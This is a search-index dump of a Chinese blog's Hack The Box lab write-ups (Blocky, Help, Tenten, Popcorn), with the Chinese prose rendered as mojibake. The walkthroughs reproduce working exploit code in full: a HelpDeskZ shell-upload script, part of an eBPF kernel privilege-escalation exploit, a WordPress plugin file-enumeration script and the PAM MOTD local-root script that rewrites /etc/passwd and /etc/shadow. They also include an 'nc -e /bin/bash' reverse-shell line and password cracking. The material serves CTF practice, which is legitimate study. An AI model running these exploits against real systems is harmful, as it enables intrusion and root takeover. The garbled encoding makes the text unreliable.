Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.37 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-06 10:37 CST PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft \u0026#8211; Under Construction! 8192/tcp closed sophos Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel å¼€æ”¾äº†21ã€22ã€80 ç«¯å£ã€‚ å°è¯•æœç´¢ ProFTPD 1.3.5a ç‰ˆæœ¬çš„æ¼æ´ï¼Œå‘ç°æœªæˆæƒæ–‡ä»¶å¤åˆ¶æ¼æ´ï¼Œåˆ©ç”¨ msf æµ‹è¯•ï¼Œæ— æ³•åˆ©ç”¨ã€‚ è®¿é—® 80 ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªç®€å•çš„ WordPress ç«™ç‚¹ï¼Œ åˆ©ç”¨ wpscan å·¥å…·è¿›è¡Œæ‰«æï¼š wpscan --enumerate t --enumerate p --enumerate u --url=http://10.10.10.37/ å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š ç”¨æˆ·å notch ä¸»é¢˜ twentyseventeen æ’ä»¶ akismet - v3.3.2 æœªå‘ç°ç›¸å…³æ¼æ´ã€‚ ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"ç›®å½•çˆ†ç ´ ä½¿ç”¨ dirbuster å·¥å…·ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š å‘ç°äº†ä¸€ä¸ª plugins ç›®å½•ï¼Œç”±äºæ­£å¸¸çš„ wp æ’ä»¶ç›®å½•å­˜æ”¾åœ¨ wp-content/plugins ä¸‹ï¼Œè®¿é—® è¯¥ç›®å½•ï¼Œå¾—åˆ°ä¸¤ä¸ª jar åŒ…ï¼š å°† jar åŒ…ä¸‹è½½åˆ°æœ¬åœ°ï¼Œåç¼–è¯‘ï¼Œå¾—åˆ°æ•°æ®åº“çš„ç”¨æˆ·åçš„å¯†ç ï¼š å°è¯•ä½¿ç”¨è¯¥å¯†ç ç™»å½• phpmyadminï¼Œå‘ç°æˆåŠŸç™»å½•ï¼š ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ åœ¨ç°æœ‰çš„åŸºç¡€ä¸Šï¼Œå°è¯•ä½¿ç”¨ sqlè¯­å¥ è¯»æ–‡ä»¶ï¼Œé¦–å…ˆæŸ¥çœ‹å¯è¯»ç›®å½•çš„èŒƒå›´ï¼š show GLOBAL VARIABLES like \"%secure_file_priv\" ä½†æ˜¯ç›®å½•è¢«é™åˆ¶ï¼Œè½¬è€Œå…¶å®ƒæ€è·¯ã€‚ æƒ³åˆ°å¯†ç å¯èƒ½é‡å¤åˆ©ç”¨ï¼Œé‚åˆ©ç”¨ notch è´¦æˆ·å’Œ mysql çš„å¯†ç ç™»å½• sshã€‚ å‘ç°å¯ä»¥ç™»å½•ã€‚ æŸ¥çœ‹ user.txt è·å¾—ç¬¬ä¸€ä¸ª flagã€‚ å°è¯•æƒé™æå‡ï¼Œä½†æ˜¯è¯•äº†å¥½å¤šæ–¹æ³•éƒ½ä¸è¡Œï¼Œçªç„¶æƒ³åˆ°å†æ¬¡ç”¨ç›¸åŒçš„å¯†ç åˆ‡åˆ° root ç”¨æˆ·ï¼Œå‘ç°æˆåŠŸåˆ‡åˆ° rootã€‚ æŸ¥çœ‹ root.txtï¼Œå¾—åˆ°ç¬¬äºŒä¸ª flagã€‚ ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Help ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.121 å‘ç° 22ã€80ã€3000 ç«¯å£å¼€æ”¾ï¼Œè®¿é—® 80 ç«¯å£ï¼Œæ˜¯ä¸€ä¸ª apache é»˜è®¤é¡µé¢ã€‚ ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"ç›®å½•çˆ†ç ´ åˆ©ç”¨ dirbuster çˆ†ç ´ç›®å½•ï¼š å‘ç° support ç›®å½•ï¼Œè®¿é—®å¾—åˆ°ï¼š æœç´¢ helpdeskz ç›¸å…³æ¼æ´ï¼Œå‘ç°ä¸€å¤„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼šhttps://www.exploit-db.com/exploits/40300 import hashlib import time import sys import requests print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit' if len(sys.argv) \u003c 3: print \"Usage: {} [baseUrl] [nameOfUploadedFile]\".format(sys.argv[0]) sys.exit(1) helpdeskzBaseUrl = sys.argv[1] fileName = sys.argv[2] currentTime = int(time.time()) for x in range(0, 300): plaintext = fileName + str(currentTime - x) md5hash = hashlib.md5(plaintext).hexdigest() url = helpdeskzBaseUrl+md5hash+'.php' response = requests.head(url) if response.status_code == 200: print \"found!\" print url sys.exit(0) print \"Sorry, I did not find anything\" ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ é¦–å…ˆï¼Œåœ¨ submit a ticket å¤„ä¸Šä¼ ä¸€ä¸ªåå¼¹ shell çš„è„šæœ¬æ–‡ä»¶ï¼š è¿”å›ï¼š ç„¶åï¼Œæ‰§è¡Œ exp è„šæœ¬ï¼š python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php ä½†æ˜¯æ­¤å¤„æ— è®ºå¦‚ä½•éƒ½ä¸èƒ½è®¿é—®åˆ° shellï¼Œåæ¥ç»è¿‡æŸ¥è¯¢ç›¸å…³èµ„æ–™å¾—çŸ¥ï¼šç”±äºæœåŠ¡å™¨æ‰€åœ¨åœ°åŒºçš„æ—¶åŒºä¸å›½å†…çš„æ—¶åŒºä¸ä¸€æ ·å¯¼è‡´ current - x å¾—åˆ°çš„æ•°ä¸æ­£ç¡®ï¼Œå› æ­¤ï¼Œå°†è„šæœ¬ç¨ä½œæ”¹åŠ¨ï¼š import hashlib import time, calendar import sys import requests print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit' if len(sys.argv) \u003c 3: print \"Usage: {} [baseUrl] [nameOfUploadedFile]\".format(sys.argv[0]) sys.exit(1) helpdeskzBaseUrl = sys.argv[1] fileName = sys.argv[2] # currentTime = int(time.time()) response = requests.head(helpdeskzBaseUrl) serverTime = response.headers[\"Date\"] print serverTime timeFormat = \"%a, %d %b %Y %H:%M:%S %Z\" currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat))) print currentTime for x in range(0, 90): plaintext = fileName + str(currentTime - x) md5hash = hashlib.md5(plaintext).hexdigest() url = helpdeskzBaseUrl+md5hash+'.php' response = requests.head(url) if response.status_code == 200: print \"found!\" print url sys.exit(0) print \"Sorry, I did not find anything\" æˆåŠŸåå¼¹ shellï¼š æŸ¥çœ‹ user.txt è·å–ç¬¬ä¸€ä¸ª flag whoami æŸ¥çœ‹æƒé™ï¼Œå‘ç°æ—¶æ™®é€šç”¨æˆ·æƒé™ uname -aæŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬å·ï¼Œå°è¯•å†…æ ¸ææƒã€‚ ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:3:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"ææƒ æœç´¢ç›¸å…³å†…æ ¸ç‰ˆæœ¬æ¼æ´ä¿¡æ¯ï¼Œå‘ç°https://www.exploit-db.com/exploits/44298 /* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */ // Tested on: // 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 // if different kernel adjust CRED offset + check kernel stack size #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003cerrno.h\u003e #include \u003cfcntl.h\u003e #include \u003cstring.h\u003e #include \u003clinux/bpf.h\u003e #include \u003clinux/unistd.h\u003e #include \u003csys/mman.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/un.h\u003e #include \u003csys/stat.h\u003e #include \u003cstdint.h\u003e #define PHYS_OFFSET 0xffff880000000000 #define CRED_OFFSET 0x5f8 #define UID_OFFSET 4 #define LOG_BUF_SIZE 65536 #define PROGSIZE 328 int sockets[2]; int mapfd, progfd; char *__prog = \"\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff\" \"\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff\" \"\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00\" \"\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; char bpf_log_buf[LOG_BUF_SIZE]; static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version) { union bpf_attr attr = { .prog_type = prog_type, .insns = (__u64)insns, .insn_cnt = prog_len / sizeof(struct bpf_insn), .license = (__u64)license, .log_buf = (__u64)bpf_log_buf, .log_size = LOG_BUF_SIZE, .log_level = 1, }; attr.kern_version = kern_version; bpf_log_buf[0] = 0; return syscall(__NR_bpf, BPF_PROG_LOAD, \u0026attr, sizeof(attr)); } static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries) { union bpf_attr attr = { .map_type = map_type, .key_size = key_size, .value_size = value_size, .max_entries = max_entries }; return syscall(__NR_bpf, BPF_MAP_CREATE, \u0026attr, sizeof(attr)); } static int bpf_update_elem(uint64_t key, uint64_t value) { union bpf_attr attr = { .map_fd = mapfd, .key = (__u64)\u0026key, .value = (__u64)\u0026value, .flags = 0, }; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } static int bpf_lookup_elem(void *key, void *value) { union bpf_attr attr = { .map_fd = mapfd, .key = (__u64)key, .value = (__u64)value, }; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, \u0026attr, sizeof(attr)); } static void __exit(char *err) { fprintf(stderr, \"error: %s\\n\", err); exit(-1); } static void prep(void) { mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3); if (mapfd \u003c 0) __exit(strerror(errno)); progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, \"GPL\", 0); if (progfd \u003c 0) __exit(strerror(errno)); if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno)); if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, \u0026progfd, sizeof(progfd)) \u003c 0) __exit(strerror(errno)); } st","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:4:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Tenten ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.6 å‘ç°æœåŠ¡å™¨å¼€äº† 22 ç«¯å£å’Œ 80 ç«¯å£æµè§ˆå™¨è®¿é—® http æœåŠ¡ï¼Œå‘ç° wordpress ç«™ç‚¹ã€‚ ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"æ¼æ´æ‰«æ åˆ©ç”¨ wpscan å·¥å…·æ‰«æä¸€æ³¢ wordpress ç«™çš„ä¿¡æ¯ï¼š wpscan --enumerate t --enumerate p --enumerate u --url=http://10.10.10.10/ å‘ç°ç”¨æˆ·åï¼š æ’ä»¶æ¼æ´ï¼š ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ æœç´¢ Job-Manager ç›¸å…³æ¼æ´ï¼Œå‘ç°ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨è¯¥æ’ä»¶å¯ä»¥ä¸Šä¼  CVã€‚ç”±äº wordpress ä¸Šä¼ çš„æ–‡ä»¶å­˜æ”¾åœ¨ upload/year/month/filename ä¸‹ï¼Œå› æ­¤å¯ä»¥çˆ†ç ´å‡ºä¸Šä¼ çš„ CV æ–‡ä»¶ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„æ¼ã€‚ é¦–å…ˆè®¿é—® Jobs Listingï¼š åœ¨ apply now ä¸‹è·å– job è¯¦ç»†ä¿¡æ¯ï¼š æ›´æ”¹ url ä¸­çš„ number å€¼ï¼Œå¯ä»¥å¾—åˆ°å…¶å®ƒçš„ JOB APPLICATIONï¼Œ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œæšä¸¾ job titleï¼š å‘ç° HackerAccessGranted titleï¼Œå°è¯•ä½¿ç”¨ exp è¿›è¡Œç”¨æˆ·ä¸Šä¼  cv çš„æšä¸¾ï¼š import requests print \"\"\" CVE-2015-6668 Title: CV filename disclosure on Job-Manager WP Plugin Author: Evangelos Mourikis Blog: https://vagmour.eu Plugin URL: http://www.wp-jobmanager.com Versions: \u003c=0.7.25 \"\"\" website = raw_input('Enter a vulnerable website: ') filename = raw_input('Enter a file name: ') filename2 = filename.replace(\" \", \"-\") for year in range(2016,2019): for i in range(1,13): for extension in {'php','html','pdf','png','gif','jpg','jpeg'}: URL = website + \"/wp-content/uploads/\" + str(year) + \"/\" + \"{:02}\".format(i) + \"/\" + filename2 + \".\" + extension print URL req = requests.get(URL) if req.status_code==200: print \"[+] URL of CV found! \" + URL å‘ç°å¦‚ä¸‹æ•æ„Ÿæ–‡ä»¶ï¼š è®¿é—®ï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚ çŒœæµ‹å›¾ç‰‡éšå†™ï¼Œä½¿ç”¨ steghide extract -sf HackerAccessGranted.jpgï¼Œå¾—åˆ° id_rsa æ–‡ä»¶ã€‚ æ‰“å¼€ id_rsa æ–‡ä»¶ï¼Œå‘ç°è¯¥æ–‡ä»¶è¢«åŠ å¯†ï¼š ä½¿ç”¨ ssh2john è„šæœ¬æ–‡ä»¶å°†åŠ å¯†çš„å†…å®¹è½¬åŒ–ä¸º john å¯ä»¥ç ´è§£çš„æ–‡ä»¶ python2 ssh2john id_rsa \u003e ssh_login å¾—åˆ°ï¼š ä½¿ç”¨ john è¿›è¡Œå¯†ç ç ´è§£ï¼š john ssh_login --wordlist=rockyou.txt å¾—åˆ° id_rsa çš„å¯†ç ï¼šsuperpasswordã€‚ å°è¯•ç™»å½•æœåŠ¡å™¨ï¼š ssh -i id_rsa takis@10.10.10.10 å¾—åˆ°ç¬¬ä¸€ä¸ª flagã€‚ å°è¯•è¿›å…¥ root ç›®å½•ï¼Œå‘ç°æƒé™ä¸è¶³ã€‚ ä½¿ç”¨ sudo -l å‘½ä»¤ï¼ŒæŸ¥çœ‹æ— éœ€å¯†ç è¯¾æ‰§è¡Œçš„å‘½ä»¤ï¼š å‘ç° /bin/fuckin æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼š æ‰§è¡Œï¼šsudo /bin/fuckin /bin/bashï¼Œå³å¯è·å¾— root æƒé™ï¼š ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Popcorn ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.6 å‘ç°æœåŠ¡å™¨å¼€äº† 22 ç«¯å£å’Œ 80 ç«¯å£æµè§ˆå™¨è®¿é—® http æœåŠ¡ï¼Œå‘ç° åªæœ‰ apache çš„é»˜è®¤é¡µé¢ã€‚ ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"ç›®å½•æ‰«æ åˆ©ç”¨ dirsearch å·¥å…·æ‰«æä¸€æ³¢ç›®å½•ï¼š python3 dirsearch -u http://10.10.10.6 -e html å‘ç° test.php é¡µé¢å’Œ torrent ç›®å½•ï¼Œé’ˆå¯¹ torrent ç›®å½•è¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç° upload ä¸Šä¼ ç›®å½•å¯ä»¥è®¿é—®ï¼ŒåŒæ—¶å­˜åœ¨ index.php é¡µé¢ã€‚ ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"åŠŸèƒ½ç‚¹æœç´¢ è¯¥ç½‘ç«™ä¸º bt ç§å­è®ºå›ç«™ï¼Œæ³¨å†Œç”¨æˆ·ï¼Œå‘ç°ä¸Šä¼ é¡µé¢ã€‚ ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:3","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ åœ¨ä¸Šä¼ ç‚¹å°è¯•ä¸Šä¼  webshellï¼Œå‘ç°å¤±è´¥ï¼ŒçŒœæµ‹ç¨‹åºæ£€æµ‹ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦ä¸ºæ ‡å‡†çš„ bt ç§å­æ–‡ä»¶ï¼Œä¸”å¹¶æœªç»•è¿‡è¿‡æ»¤ã€‚ ç»§ç»­ä¸Šä¼ æ­£å¸¸çš„ bt ç§å­æ–‡ä»¶ï¼Œè¿›è¡Œè¿›ä¸€æ­¥æµ‹è¯•: å‘ç°åœ¨ä¸Šä¼ å¥½çš„ç§å­é¡µé¢å­˜åœ¨ screenshots å›¾æ ‡ä¸Šä¼ ç‚¹ï¼Œ å°è¯•ä¸Šä¼  webshellï¼Œå‘ç°æˆåŠŸä¸Šä¼ ã€‚ è®¿é—® upload ç›®å½•ï¼Œå¾—åˆ° webshell çš„åœ°å€ï¼š èœåˆ€è¿æ¥ï¼š æˆåŠŸè·å– user çš„ flagã€‚ åŒæ—¶åœ¨ home ç›®å½•ä¸‹å‘ç° .cache æ–‡ä»¶å¤¹ï¼Œè¿›å…¥åå‘ç° motd.legal-displayed æ–‡ä»¶ã€‚ åˆ©ç”¨æœç´¢å¼•æ“æœç´¢ç›¸å…³æ–‡æ¡£ï¼Œå‘ç°ï¼š https://www.exploit-db.com/exploits/14339 åˆ©ç”¨è™šæ‹Ÿç»ˆç«¯åå¼¹ä¸€ä¸ª shell åˆ°æœ¬åœ°ï¼Œä¾¿äºææƒæ“ä½œã€‚ æœ¬æœºï¼š nc -l 4444 å—å®³æœºï¼šnc -e /bin/bash 10.10.14.10 4444 åˆ©ç”¨èœåˆ€ä¸Šä¼  exp è„šæœ¬: #!/bin/bash # # Exploit Title: Ubuntu PAM MOTD local root # Date: July 9, 2010 # Author: Anonymous # Software Link: http://packages.ubuntu.com/ # Version: pam-1.1.0 # Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx) # CVE: CVE-2010-0832 # Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i # References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen P='toor:x:0:0:root:/root:/bin/bash' S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::' echo \"[*] Ubuntu PAM MOTD local root\" [ -z \"$(which ssh)\" ] \u0026\u0026 echo \"[-] ssh is a requirement\" \u0026\u0026 exit 1 [ -z \"$(which ssh-keygen)\" ] \u0026\u0026 echo \"[-] ssh-keygen is a requirement\" \u0026\u0026 exit 1 [ -z \"$(ps -u root |grep sshd)\" ] \u0026\u0026 echo \"[-] a running sshd is a requirement\" \u0026\u0026 exit 1 backup() { [ -e \"$1\" ] \u0026\u0026 [ -e \"$1\".bak ] \u0026\u0026 rm -rf \"$1\".bak [ -e \"$1\" ] || return 0 mv \"$1\"{,.bak} || return 1 echo \"[*] Backuped $1\" } restore() { [ -e \"$1\" ] \u0026\u0026 rm -rf \"$1\" [ -e \"$1\".bak ] || return 0 mv \"$1\"{.bak,} || return 1 echo \"[*] Restored $1\" } key_create() { backup ~/.ssh/authorized_keys ssh-keygen -q -t rsa -N '' -C 'pam' -f \"$KEY\" || return 1 [ ! -d ~/.ssh ] \u0026\u0026 { mkdir ~/.ssh || return 1; } mv \"$KEY.pub\" ~/.ssh/authorized_keys || return 1 echo \"[*] SSH key set up\" } key_remove() { rm -f \"$KEY\" restore ~/.ssh/authorized_keys echo \"[*] SSH key removed\" } own() { [ -e ~/.cache ] \u0026\u0026 rm -rf ~/.cache ln -s \"$1\" ~/.cache || return 1 echo \"[*] spawn ssh\" ssh -o 'NoHostAuthenticationForLocalhost yes' -i \"$KEY\" localhost true [ -w \"$1\" ] || { echo \"[-] Own $1 failed\"; restore ~/.cache; bye; } echo \"[+] owned: $1\" } bye() { key_remove exit 1 } KEY=\"$(mktemp -u)\" key_create || { echo \"[-] Failed to setup SSH key\"; exit 1; } backup ~/.cache || { echo \"[-] Failed to backup ~/.cache\"; bye; } own /etc/passwd \u0026\u0026 echo \"$P\" \u003e\u003e /etc/passwd own /etc/shadow \u0026\u0026 echo \"$S\" \u003e\u003e /etc/shadow restore ~/.cache || { echo \"[-] Failed to restore ~/.cache\"; bye; } key_remove echo \"[+] Success! Use password toor to get root\" su -c \"sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \\ chgrp shadow /etc/shadow; nscd -i passwd \u003e/dev/null 2\u003e\u00261; bash\" toor å¹¶ç»™è¯¥è„šæœ¬èµ‹äºˆæ‰§è¡Œæƒé™ï¼š chmod + x 1.sh æ‰§è¡Œè„šæœ¬ï¼Œè·å¾— root æƒé™ï¼š ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Devel ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” 